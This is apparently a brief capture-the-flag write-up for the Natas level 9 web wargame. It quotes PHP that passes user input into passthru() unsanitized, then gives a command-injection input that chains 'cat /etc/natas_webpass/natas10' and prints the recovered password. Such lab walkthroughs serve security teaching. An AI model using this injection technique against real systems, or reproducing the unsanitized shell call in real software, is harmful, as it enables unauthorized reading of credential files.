if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
passthru executes commands. I've used the following command to get the password:
key; cat /etc/natas_webpass/natas10; cat

Output: 
s09byvi8880wqhbnonMFMW8byCojm8eA

African
. . . .